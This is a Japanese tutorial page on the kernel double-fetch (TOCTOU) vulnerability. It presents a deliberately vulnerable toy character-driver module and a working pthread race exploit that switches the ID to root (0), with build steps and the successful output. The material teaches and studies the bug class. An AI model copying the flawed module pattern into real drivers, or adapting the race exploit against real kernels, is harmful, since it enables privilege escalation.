---
description: 最も単純な脆弱性
---

# Double-Fetch

**ダブルフェッチ(double-fetch)** 脆弱性とは、ユーザー空間(userspace)のデータに複数回アクセスしてしまう脆弱性です。ユーザー空間のプログラムは、パラメータを **ポインタ** としてカーネルに渡すのが一般的なので、そのデータはいつでも書き換えられる可能性があります。ちょうど良いタイミングで書き換えられると、攻撃者がカーネルの実行を乗っ取れるかもしれません。

## 脆弱なカーネルモジュール

まずは、あえて回りくどい例から始めましょう。ここでやりたいのは、モジュールが保持している `id` を変更することだけです。`root` の ID である `0` には設定できませんが、それ以外の値はすべて許可されています。

以下のコードは、カーネルモジュールの `read()` 関数の中身にあたります。[前に説明した定型コード](../writing-a-char-module/a-communicatable-char-driver.md)は省き、関係する部分だけを載せています。

```c
#define PASSWORD    "p4ssw0rd"

typedef struct {
    int id;
    char password[10];
} Credentials;

static int id = 1001;

static ssize_t df_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    Credentials *creds = (Credentials *)buf;

    printk(KERN_INFO "[Double-Fetch] Reading password from user...");

    if (creds->id == 0) {
        printk(KERN_ALERT "[Double-Fetch] Attempted to log in as root!");
        return -1;
    }

    // 信頼性を上げるため
    msleep(1000);

    if (!strcmp(creds->password, PASSWORD)) {
        id = creds->id;
        printk(KERN_INFO "[Double-Fetch] Password correct! ID set to %d", id);
        return id;
    }

    printk(KERN_ALERT "[Double-Fetch] Password incorrect!");
    return -1;
}
```

このプログラムは次のことを行います。

* 切り替え先の ID が `0` かどうかを確認する
  * `0` なら、root としてのログインを試みたことになるので許可しない
* 1 秒間スリープする(例を分かりやすくするためだけのもので、後で取り除きます)
* パスワードを `p4ssw0rd` と比較する
  * 一致すれば、`id` 変数に `creds` 構造体の `id` を設定する

### 単純なやり取り

モジュールとやり取りしたいので、簡単な C プログラムを用意します。

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    int id;
    char password[10];
} Credentials;

int main() {
    int fd = open("/dev/double_fetch", O_RDWR);
    printf("FD: %d\n", fd);

    Credentials creds;
    creds.id = 900;
    strcpy(creds.password, "p4ssw0rd");

    int res_id = write(fd, &creds, 0);    // ここの最後の引数は結果に影響しない
    printf("New ID: %d\n", res_id);

    return 0;
}
```

VM には共有ライブラリがないため、静的リンクでコンパイルします。

```bash
gcc -static -o exploit exploit.c
```

期待どおり `id` 変数は `900` に設定されます。`dmesg` で確認できます。

```
$ dmesg
[...]
[    3.104165] [Double-Fetch] Password correct! ID set to 900
```

ここまでは問題なく動きます。

## Double-Fetch の悪用と ID 0 への切り替え

{% file src="../../../.gitbook/assets/double_fetch_sleep.zip" %}

欠陥は、`creds->id` が **2 回デリファレンス(dereference)される** ことです。どういうことでしょうか。カーネルモジュールには `Credentials` 構造体への **参照** が渡されます。

```c
Credentials *creds = (Credentials *)buf;
```

これは **ポインタ** であり、ここが _最も_ 重要なポイントです。モジュールとやり取りするとき、私たちは _特定のメモリアドレス_ を渡しています。そのアドレスには、私たちが定義してモジュールに渡した `Credentials` 構造体が入っています。カーネルはコピーを持って **いません**。ユーザーが持つコピーを頼りに、ユーザー空間のメモリまで読みに行っているのです。

この構造体はユーザーが制御できるので、ユーザーは _好きなタイミングで書き換えられます_。

カーネルモジュールは、構造体の `id` フィールドを 2 回使っています。1 回目は、切り替え先の ID が有効(`0` ではない)かどうかの確認です。

```c
if (creds->id == 0) {
    printk(KERN_ALERT "[Double-Fetch] Attempted to log in as root!");
    return -1;
}
```

2 回目は、`id` 変数への設定です。

```c
if (!strcmp(creds->password, PASSWORD)) {
    id = creds->id;
    printk(KERN_INFO "[Double-Fetch] Password correct! ID set to %d", id);
    return id;
}
```

これも問題なさそうに見えますが、そうではありません。_この 2 回の使用の間に値が変わるのを、何が止めてくれるのでしょうか_。答えは簡単で、何もありません。これが、ユーザー空間の攻略とカーネル空間の攻略の違いです。

### 概念実証: ID 0 への切り替え

`creds->id` の 2 つのデリファレンスの間には、時間の幅があります。ここでは 1 秒間スリープすることで、その幅を人為的に広げています。これは **レースコンディション(race condition)** です。狙いは、その時間幅の中で `id` を切り替えることです。うまくいけば、最初のチェックは通過し(ID はこの時点では `900` です)、`id` にコピーされるときには `0` になっていて、セキュリティチェックを回避できます。



流れを図にするとこうなります。



<figure><img src="../../../.gitbook/assets/double_fetch_id (1).svg" alt=""><figcaption></figcaption></figure>

待機している間に `id` を入れ替えます。

{% hint style="info" %}
自分でカーネルをコンパイルする場合は、別のスレッドで書き換える必要があるため、`CONFIG_SMP` を有効にしなければなりません。さらに、2 コアを有効にするため、QEMU にフラグ `-smp 2`(またはそれ以上)を付ける必要があります。ただし、フラグなしでも既定で複数コアになることがあります。この例はスリープがあるおかげで SMP なしでも動くかもしれませんが、スリープなしの第 2 部に進むと、複数コアが必要になります。

C プログラムはカーネルモジュールが戻るまで `write` で止まってしまうので、メインスレッドは使えません。
{% endhint %}

以上を踏まえると、「エクスプロイト」はかなり単純です。別のスレッドを起動し、0.3 秒待ってから `id` を書き換えます。

{% code overflow="wrap" lineNumbers="true" %}
```c
// gcc -static -o exploit -pthread exploit.c

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void *switcher(void *arg);

typedef struct {
    int id;
    char password[10];
} Credentials;

int main() {
    // モジュールとやり取りする
    int fd = open("/dev/double_fetch", O_RDWR);
    printf("FD: %d\n", fd);

    // ID は適当な値にして、パスワードは正しく設定する
    Credentials creds;
    creds.id = 900;
    strcpy(creds.password, "p4ssw0rd");

    // switcher スレッドを用意する
    // `creds` へのポインタを渡して、書き換えられるようにする
    pthread_t thread;

    if (pthread_create(&thread, NULL, switcher, &creds)) {
        fprintf(stderr, "Error creating thread\n");
        return -1;
    }

    // ここで cred 構造体をモジュールに書き込む
    // 約 0.3 秒後に switcher によって書き換えられるはず
    int res_id = write(fd, &creds, 0);

    // write は書き換えた後の id を返す
    // うまくいけば 0 になる
    printf("New ID: %d\n", res_id);

    // スレッドをきちんと終了させる
    if (pthread_join(thread, NULL)) {
        fprintf(stderr, "Error joining thread\n");
        return -1;
    }

    return 0;
}

void *switcher(void *arg) {
    Credentials *creds = (Credentials *)arg;

    // モジュールがスリープするまで待つ - 最初の ID チェックより前に書き換えたくない!
    sleep(0.3);

    creds->id = 0;
}
```
{% endcode %}

VM には共有ライブラリがないので、静的リンクでコンパイルする必要があります。

```bash
$ gcc -static -o exploit -pthread exploit.c
```

次に、これをファイルシステムに入れる必要があります。そのために、まず `.cpio` アーカイブを展開します(別のフォルダで行うとよいでしょう)。

```bash
$ cpio -i -F initramfs.cpio
```

`exploit` をそこにコピーし、実行可能にしておきます。その後、ファイルシステムを再び圧縮します。

```bash
$ find . -not -name *.cpio | cpio -o -H newc > initramfs.cpio
```

新しく作った `initramfs.cpio` を使い、`run.sh` で VM を起動します。`exploit` を実行すると、成功します。

```bash
~ # ./exploit 
FD: 3
New ID: 0
```

{% hint style="info" %}
VM は既定で `root` としてログインした状態になっていることに注意してください。これはデバッグ用で、`dmesg` などのユーティリティでカーネルモジュールの出力を読んだりエラーを確認したり、そのほかにも後で説明するさまざまなことができるようになります。エクスプロイトをテストするときは、`init` スクリプトを書き換えて root でログインするようにしておくと便利です。ただし、最後に別のユーザーでもテストするのを忘れないでください。
{% endhint %}
